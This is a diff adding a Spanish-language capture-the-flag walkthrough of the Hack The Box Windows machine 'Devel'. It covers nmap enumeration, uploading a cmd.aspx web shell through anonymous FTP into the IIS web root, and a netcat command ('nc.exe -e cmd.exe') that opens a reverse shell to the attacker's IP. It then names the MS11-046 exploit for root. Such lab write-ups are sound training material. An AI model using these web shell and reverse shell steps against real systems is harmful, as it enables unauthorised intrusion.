@@ -17,6 +17,148 @@ tags:
   - User
 ---
 
-# Devel
-![](/TheusZero/images/post/WindowsMachines/Devel/3.png)
+devel corresponde a una maquina windows de nivel facil tanto en el user como en el root.
+
+## Introduccion
+
+Segun la comunidad podemos ver que devel tiene un nivel "facil" y podemos usar un CVE para atacar la maquina.
+![](/TheusZero/images/post/WindowsMachines/Devel/3.PNG)
 ![](/TheusZero/images/post/WindowsMachines/Devel/2.png)
+
+## Enumeracion
+
+el nmap que arrojamos fue el siguiente:
+
+```Python
+root@kali# nmap -sT -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.5
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-21 21:22 EST
+Nmap scan report for 10.10.10.5
+Host is up (0.020s latency).
+Not shown: 65533 filtered ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 13.44 seconds
+```
+
+Podemos ver que tenemos un puerto 21 ftp abierto y un puerto 80 con http funcionado, por ende, aondaremos con un -sC -sV en el peurto 21 y el 80 intentando encontrar algun tipo de script que podamos usar.
+
+```Python
+root@kali# nmap -sV -sC -p 21,80 -oA scans/nmap-scripts 10.10.10.5
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-21 21:44 EST
+Nmap scan report for 10.10.10.5
+Host is up (0.019s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 03-18-17  01:06AM       <DIR>          aspnet_client
+| 03-17-17  04:37PM                  689 iisstart.htm
+|_03-17-17  04:37PM               184946 welcome.png
+| ftp-syst:
+|_  SYST: Windows_NT
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: IIS7
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds
+```
+
+veemos que podemos acceder con **Anonymous** a la red del ftp y tenemos algunos archivos, como **welcome.png y iisstart.htm**
+
+revisando el http 80 obtenemos lo siguiente:
+![](/TheusZero/images/post/WindowsMachines/Devel/4.png)
+
+esta imagen corresponde a la misma que se encuentra en el ftp llamada welcome, por ende, podemos intuir que el ftp corresponde a un directorio web que se ejecuta en la maquina, para comprobarlo revisamos el archivo **iisstart.htm**, entonces:
+
+> http://10.10.10.5/iisstart.htm
+>> nos deberia mostrar algun tipo de respuesta
+
+Obtenemos esto:
+
+```Python
+HTTP/1.1 200 OK
+Content-Type: text/html
+Last-Modified: Fri, 17 Mar 2017 14:37:30 GMT
+Accept-Ranges: bytes
+ETag: "37b5ed12c9fd21:0"
+Server: Microsoft-IIS/7.5
+X-Powered-By: ASP.NET
+Date: Mon, 25 Feb 2019 10:40:02 GMT
+Connection: close
+Content-Length: 689
+```
+exito, ya tenemos por donde explotar
+
+## obtencion de una shell
+
+windows rara vez tiene netcat o alguna reverse shell de las que tiene pentesteyMonkey por ende, debemos usar algunas diferentes que el sistema suele tener.
+Con este comando obtenemos algunas reverse shell con aspx
+```Python
+root@kali# locate cmd.aspx
+/usr/share/davtest/backdoors/aspx_cmd.aspx
+/usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx
+root@kali# cp /usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx .
+```
+
+> usando la de /usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx
+
+entramos al ftp y subimos la shell 
+```Python
+ftp> put cmd.aspx  
+local: cmd.aspx remote: cmd.aspx 
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.                              
+1442 bytes sent in 0.00 secs (985.4465 kB/s) 
+```
+
+vamos al 80 y revisamos la shell 
+
+> http://10.10.10.5/cmd.aspx
+
+![](/TheusZero/images/post/WindowsMachines/Devel/5.png)
+
+subiremos el binario de netcat ahora para entablar una buena reverse shell
+
+![](/TheusZero/images/post/WindowsMachines/Devel/6.png)
+
+o bien 
+
+```Python
+root@kali# locate nc.exe
+/opt/SecLists/Web-Shells/FuzzDB/nc.exe
+/opt/shells/netcat/nc.exe
+/usr/lib/mono/4.5/cert-sync.exe
+/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
+/usr/share/sqlninja/apps/nc.exe
+/usr/share/windows-binaries/nc.exe
+```
+ahora lo subiremos a ftp usando BINARY ya que asi la data no se corrompe, recordar utilizar md5
+
+con netcat ya subido, lo buscamos usando recursion sobre el disco C:
+![](/TheusZero/images/post/WindowsMachines/Devel/7.png)
+```Python
+C:/Ruta/nc.exe -e cmd.exe 10.10.14.14 443
+```
+![](/TheusZero/images/post/WindowsMachines/Devel/devel-shell.gif)
+lo ejecutamos y estamos dentro
+
+#### Nishang
+
+> https://github.com/samratashok/nishang
+
+#### root
+con un systeminfo obtenemos la version de la maquina: 
+![](/TheusZero/images/post/WindowsMachines/Devel/8.png)
+ya con esto podemos dar por entendido que version es, ahora al colocarla en google podemos acceder a un exploit simple de nombre:
+> MS11-046 exploit (buscar en github)
+
+subimos el binario que esta disponible y listo, somos root. 
+
+
